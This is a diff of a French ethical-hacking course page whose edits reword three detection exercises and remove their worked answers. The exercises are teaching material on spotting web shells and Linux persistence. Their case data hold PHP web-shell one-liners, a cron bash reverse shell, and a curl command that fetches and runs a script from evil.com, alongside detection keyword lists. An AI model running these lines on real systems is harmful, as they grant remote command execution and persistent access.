@@ -13,7 +13,7 @@
 <link rel="icon" href="/assets/img/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&amp;display=swap">
 <link rel="stylesheet" href="/assets/css/tokens.css">
 <link rel="stylesheet" href="../assets/css/cours.css">
 <link rel="stylesheet" href="/assets/css/code-lab.css">
@@ -51,9 +51,9 @@
 </div></nav>
 
 <main id="content" class="b3-hackingwrap">
-<p class="crumb"><a href="../index.html">Hacking Éthique & Pentest B3</a> › <a href="../sommaire.html">Sommaire</a> › Chapitre 6</p>
+<p class="crumb"><a href="../index.html">Hacking Éthique &amp; Pentest B3</a> › <a href="../sommaire.html">Sommaire</a> › Chapitre 6</p>
 
-<h1>Chapitre 6 — Maintien de l'Accès, Post-Exploitation, Anti-Forensics & Rapport de Pentest</h1>
+<h1>Chapitre 6 — Maintien de l'Accès, Post-Exploitation, Anti-Forensics &amp; Rapport de Pentest</h1>
 
 <div class="chapmeta">
     <span class="tag">Module 6</span>
@@ -190,61 +190,51 @@ level: critical</code></pre>
 </table>
 
 <!-- code-labs:start -->
+  <div id="exercices">
   <h2>6. Études de cas &amp; applications pratiques</h2>
-  <p class="lead">Ces trois études de cas se réalisent directement dans la page. Compléter chaque grille d’analyse à partir des données du cas, puis lancer la validation pour vérifier les réponses critère par critère.</p>
-  <p>En cas d’hésitation, le bouton <strong>Expliquer mon erreur</strong> sollicite le tuteur pédagogique pour guider l’application de la méthodologie sans donner directement la solution.</p>
+  <p class="lead">Ces trois études de cas se réalisent directement dans la page. Complétez chaque grille d’analyse à partir des données du cas, puis lancez la validation pour vérifier vos réponses critère par critère.</p>
+  <p>La validation compare vos réponses aux attendus des cas affichés ; elle ne vérifie pas votre capacité à traiter toutes les situations.</p>
+  <p>En cas d’hésitation, le bouton <strong>Obtenir une aide formative générale</strong> fournit un conseil identique pour toutes les grilles, sans transmettre de réponse attendue ni utiliser le tuteur IA.</p>
 <div class="lab" id="hk3-c6-e1" data-lab
      data-exercise="hk3-c6-e1"
      data-language="analyse"
      data-height="300"
      data-stdin="SCAN_SCRIPT code=&lt;?php if(isset($_REQUEST[&quot;cmd&quot;])){ system($_REQUEST[&quot;cmd&quot;]); } ?&gt;">
-  <script type="text/plain" data-lab-starter># Grille d'analyse (hk3-c6-e1) — Détecteur de Web Shells et Obfuscation de Scripts Malveillants
-# Complétez la résolution demandée sous chaque cas ci-dessous :
+  <script type="text/plain" data-lab-starter># Grille d'analyse (hk3-c6-e1) — Recherche illustrative de signatures textuelles
+# Complétez la réponse attendue sous chaque cas ci-dessous :
 
-[Cas 1 — Web shell fortement obfusqué combinant eval, base64 et entrées POST]
+[Cas 1 — Trois familles textuelles]
 # Données : SCAN_SCRIPT code=<?php eval(base64_decode($_POST["payload"])); ?>
 A_COMPLETER
 
-[Cas 2 — Script suspect utilisant uniquement base64_decode]
+[Cas 2 — Une seule famille textuelle]
 # Données : SCAN_SCRIPT code=<?php $logo = base64_decode("iVBORw0KGgoAAAANSUhEUg=="); ?>
 A_COMPLETER
 
-[Cas 3 — Script légitime de template sans fonction dangereuse]
+[Cas 3 — Aucune des chaînes recherchées]
 # Données : SCAN_SCRIPT code=<?php echo "<h1>Bienvenue sur le portail</h1>"; ?>
 A_COMPLETER
 </script>
   <div class="lab__head">
-    <h3 class="lab__title">Exercice 1 — Détecteur de Web Shells et Obfuscation de Scripts Malveillants</h3>
+    <h3 class="lab__title">Exercice 1 — Recherche illustrative de signatures textuelles</h3>
     <div class="lab__meta">
       <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-book"></use></svg> Étude de cas</span>
+      <span class="lab__formative">Formative</span>
       <span class="badge badge--n1">Niveau 1 — Acquisition</span>
     </div>
   </div>
   <div class="lab__body">
-    <p class="lab__goal"><strong>Objectif :</strong> Analyser le code d'un script web pour repérer la présence de web shells et de mécanismes d'obfuscation.</p>
-    <div class="lab__brief"><p>Un web shell est un script déposé sur un serveur permettant à l'attaquant d'exécuter des commandes système à distance.<br><br>
-Indicateurs recherchés et scoring de dangerosité :<br>
-- Exécution de commandes système (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) : +40 points.<br>
-- Évaluation dynamique de code (<code>eval</code>, <code>assert</code>) : +30 points.<br>
-- Fonctions d'obfuscation (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) : +20 points.<br>
-- Réception directe d'entrées non filtrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) : +20 points.<br><br>
-Classification finale :<br>
-- Si <code>score &gt;= 60</code> : <code>status=MALICIOUS_WEBSHELL</code>, <code>risk=CRITICAL</code>.<br>
-- Si <code>20 &lt;= score &lt; 60</code> : <code>status=SUSPICIOUS_SCRIPT</code>, <code>risk=MEDIUM</code>.<br>
-- Si <code>score &lt; 20</code> : <code>status=BENIGN_CODE</code>, <code>risk=LOW</code>.<br><br>
-Données du cas : <code>SCAN_SCRIPT code=&lt;extrait_de_code&gt;</code>.<br>
-Résultat d’analyse attendu : <code>WEBSHELL_SCAN: score=&lt;score&gt; status=&lt;status&gt; risk=&lt;risk&gt;</code>.</p></div>
+    <p class="lab__formative-notice" id="hk3-c6-e1-formative-notice">Cette vérification est une aide à l’apprentissage : elle ne donne pas de note et ne valide pas les acquis.</p>
+    <p class="lab__goal"><strong>Objectif :</strong> Relever des familles de chaînes sans certifier la nature ou le risque d’un script.</p>
+    <div class="lab__brief"><p>Ce modèle recherche uniquement des chaînes littérales et additionne une fois chaque famille présente : commandes (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) +40 ; évaluation (<code>eval</code>, <code>assert</code>) +30 ; transformations (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) +20 ; entrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) +20. Le score et les seuils sont fictifs : une correspondance n’établit pas une malveillance et l’absence d’indice ne prouve pas l’innocuité. Une analyse complémentaire est nécessaire.</p><p>Pour <code>SCAN_SCRIPT code=&lt;texte&gt;</code>, afficher <code>WEBSHELL_SCAN: score=&lt;n&gt; status=&lt;INDICES_FORTS|INDICES|AUCUN_INDICE&gt; risk=NON_EVALUE</code> : INDICES_FORTS à partir de 60, INDICES de 20 à 59, AUCUN_INDICE en dessous de 20.</p></div>
     <div class="lab__sample">
       <div class="lab__sample-part"><b>Cas d’exemple</b><pre>SCAN_SCRIPT code=&lt;?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?&gt;</pre></div>
-      <div class="lab__sample-part"><b>Résolution attendue</b><pre>WEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL</pre></div>
     </div>
-    <p class="lab__note">Web shell PHP classique à une ligne combinant system et $_REQUEST.</p>
     <details class="lab__hints">
-      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Trois indices, rédigés en mots</summary>
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
       <ol>
-        <li>Extrayez le code après "code=" avec l’extraction des champs[1].</li>
-        <li>Testez la présence des différentes familles de mots-clés.</li>
-        <li>Attribuez la classification selon les seuils 60 et 20.</li>
+        <li>Compter chaque famille au maximum une fois.</li>
+        <li>Le résultat ne classe pas le script comme bénin ou malveillant.</li>
       </ol>
     </details>
   </div>
@@ -255,7 +245,7 @@ Résultat d’analyse attendu : <code>WEBSHELL_SCAN: score=&lt;score&gt; status=
      data-language="analyse"
      data-height="300"
      data-stdin="PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1">
-  <script type="text/plain" data-lab-starter># Grille d'analyse (hk3-c6-e2) — Analyseur de Persistance Linux (Crontab & Reverse Shells)
+  <script type="text/plain" data-lab-starter># Grille d'analyse (hk3-c6-e2) — Recherche de motifs de persistance Linux
 # Complétez la résolution demandée sous chaque cas ci-dessous :
 
 [Cas 1 — Reverse shell netcat avec redirection de binaire shell]
@@ -266,41 +256,37 @@ A_COMPLETER
 # Données : PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash
 A_COMPLETER
 
-[Cas 3 — Tâche cron légitime de sauvegarde et synchronisation]
+[Cas 3 — Tâche cron de sauvegarde et synchronisation]
 # Données : PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup
 A_COMPLETER
 </script>
   <div class="lab__head">
-    <h3 class="lab__title">Exercice 2 — Analyseur de Persistance Linux (Crontab &amp; Reverse Shells)</h3>
+    <h3 class="lab__title">Exercice 2 — Recherche de motifs de persistance Linux</h3>
     <div class="lab__meta">
       <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-book"></use></svg> Étude de cas</span>
+      <span class="lab__formative">Formative</span>
       <span class="badge badge--n2">Niveau 2 — Application</span>
     </div>
   </div>
   <div class="lab__body">
-    <p class="lab__goal"><strong>Objectif :</strong> Auditer les mécanismes de persistance et détecter les commandes de shell inverse (Reverse Shell).</p>
-    <div class="lab__brief"><p>Après obtention d'un accès initial, l'attaquant configure une tâche planifiée ou un script de démarrage pour maintenir sa connexion.<br><br>
-Signatures d'attaques surveillées :<br>
+    <p class="lab__formative-notice" id="hk3-c6-e2-formative-notice">Cette vérification est une aide à l’apprentissage : elle ne donne pas de note et ne valide pas les acquis.</p>
+    <p class="lab__goal"><strong>Objectif :</strong> Repérer des motifs textuels associés à des techniques de persistance, sans conclure sur leur intention ou leur risque.</p>
+    <div class="lab__brief"><p>Une tâche planifiée ou un script de démarrage peut être utilisé pour maintenir un accès. Cette grille recherche uniquement quatre motifs textuels dans une commande ; elle ne lance aucune commande.<br><br>
+Motifs recherchés, par ordre de priorité :<br>
 1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>
 2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>
 3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>
 4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>
-Règles de diagnostic :<br>
-- Si l'une des signatures est présente :<br>
-  <code>malicious=TRUE</code>, <code>signature=&lt;NOM_SIGNATURE&gt;</code>, <code>risk=CRITICAL</code>.<br>
-- Sinon :<br>
-  <code>malicious=FALSE</code>, <code>signature=CLEAN</code>, <code>risk=LOW</code>.<br><br>
+Indiquez le premier motif trouvé, ou <code>signature=AUCUNE_CORRESPONDANCE</code> si aucun ne correspond. Une correspondance ne prouve ni l'intention malveillante ni le niveau de risque ; son absence ne prouve pas non plus l'innocuité. Dans les deux cas, renseignez <code>malicious=NON_EVALUE</code> et <code>risk=NON_EVALUE</code> : une analyse complémentaire est nécessaire.<br><br>
 Données du cas : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>
-Résultat d’analyse attendu : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=&lt;TRUE|FALSE&gt; signature=&lt;sig&gt; risk=&lt;risk&gt;</code>.</p></div>
+Résultat d’analyse attendu : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=NON_EVALUE signature=&lt;sig&gt; risk=NON_EVALUE</code>.</p></div>
     <div class="lab__sample">
       <div class="lab__sample-part"><b>Cas d’exemple</b><pre>PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</pre></div>
-      <div class="lab__sample-part"><b>Résolution attendue</b><pre>PERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL</pre></div>
     </div>
-    <p class="lab__note">Tâche cron récurrente établissant un reverse shell interactif vers l'attaquant.</p>
     <details class="lab__hints">
       <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Trois indices, rédigés en mots</summary>
       <ol>
-        <li>Extrayez la commande avec l’extraction des champs[1].</li>
+        <li>Repérez le type après type= et la commande après command=.</li>
         <li>Testez les motifs BASH_REVERSE_SHELL, NETCAT_REVERSE_SHELL, DOWNLOAD_EXECUTE, PYTHON_SOCKET_SHELL.</li>
         <li>Formatez la sortie PERSIST_RESULT.</li>
       </ol>
@@ -332,10 +318,12 @@ A_COMPLETER
     <h3 class="lab__title">Exercice 3 — Générateur de Synthèse Managériale et Matrice de Risque de Pentest</h3>
     <div class="lab__meta">
       <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-book"></use></svg> Étude de cas</span>
+      <span class="lab__formative">Formative</span>
       <span class="badge badge--n3">Niveau 3 — Raisonnement</span>
     </div>
   </div>
   <div class="lab__body">
+    <p class="lab__formative-notice" id="hk3-c6-e3-formative-notice">Cette vérification est une aide à l’apprentissage : elle ne donne pas de note et ne valide pas les acquis.</p>
     <p class="lab__goal"><strong>Objectif :</strong> Agréger les vulnérabilités découvertes, calculer le score de risque global et qualifier la posture de sécurité.</p>
     <div class="lab__brief"><p>Le rapport d'intrusion conclut chaque mandat de pentest par une synthèse managériale (Executive Summary) et une matrice de sévérité.<br><br>
 Pondération du score de risque :<br>
@@ -354,9 +342,7 @@ Résultat d’analyse attendu :<br>
 <code>PENTEST_SUMMARY: total_findings=&lt;N&gt; critical=&lt;C&gt; high=&lt;H&gt; medium=&lt;M&gt; low=&lt;L&gt; risk_score=&lt;score&gt; posture=&lt;posture&gt;</code>.</p></div>
     <div class="lab__sample">
       <div class="lab__sample-part"><b>Cas d’exemple</b><pre>PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW</pre></div>
-      <div class="lab__sample-part"><b>Résolution attendue</b><pre>PENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL</pre></div>
     </div>
-    <p class="lab__note">Une vulnérabilité critique déclenche immédiatement la posture COMPROMISED_CRITICAL.</p>
     <details class="lab__hints">
       <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Trois indices, rédigés en mots</summary>
       <ol>
@@ -367,6 +353,7 @@ Résultat d’analyse attendu :<br>
     </details>
   </div>
 </div>
+  </div>
   <!-- code-labs:end -->
   <h2>7. QCM — niveau examen</h2>
 
@@ -510,9 +497,9 @@ Résultat d’analyse attendu :<br>
     <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-chart"></use></svg> Comment vous auto-évaluer</div>
     <p>Le QCM ci-dessus est un test de maîtrise. Lisez votre pourcentage :</p>
     <div class="bands">
-      <div class="bandrow bandrow--low"><strong>< 50 % — </strong>&lt; 50 % — Reprenez les sections théoriques et revoyez les définitions clés.</div>
-      <div class="bandrow bandrow--mid"><strong>50–69 % — </strong>Pratique les exercices N1 de l'atelier avant de retenter le test.</div>
-      <div class="bandrow bandrow--good"><strong>70–94 % — </strong>Bon niveau opérationnel : affine les cas limites et les options d'outils.</div>
+      <div class="bandrow bandrow--low"><strong>&lt; 50 % — </strong>Reprenez les sections théoriques et revoyez les définitions clés.</div>
+      <div class="bandrow bandrow--mid"><strong>50–69 % — </strong>Pratiquez les exercices N1 de l'atelier avant de retenter le test.</div>
+      <div class="bandrow bandrow--good"><strong>70–94 % — </strong>Bon niveau opérationnel : affinez les cas limites et les options d'outils.</div>
       <div class="bandrow bandrow--top"><strong>≥ 95 % — </strong>Maîtrise d'ingénierie validée : passez au module suivant.</div>
     </div>
     <p style="margin-top:12px"><label class="checkbox"><input type="checkbox" data-mark-done> <span>Je considère ce chapitre maîtrisé (≥ 95 % au test de maîtrise).</span></label></p>
@@ -524,7 +511,7 @@ Résultat d’analyse attendu :<br>
   </div>
 
   <p class="disclaimer">Objectif de maîtrise 19/20 — votre note réelle dépend aussi de votre travail.
-  Sources : Programme officiel Certified Ethical Hacker (CEH v12), Référentiels PTES (Penetration Testing Execution Standard), OWASP Web Security Testing Guide (WSTG v4.2), NIST SP 800-115, Documentation GTFOBins & MITRE ATT&CK.</p>
+  Sources : Programme officiel Certified Ethical Hacker (CEH v12), Référentiels PTES (Penetration Testing Execution Standard), OWASP Web Security Testing Guide (WSTG v4.2), NIST SP 800-115, Documentation GTFOBins &amp; MITRE ATT&amp;CK.</p>
 </main>
 
 <script src="../assets/js/cours.js"></script>
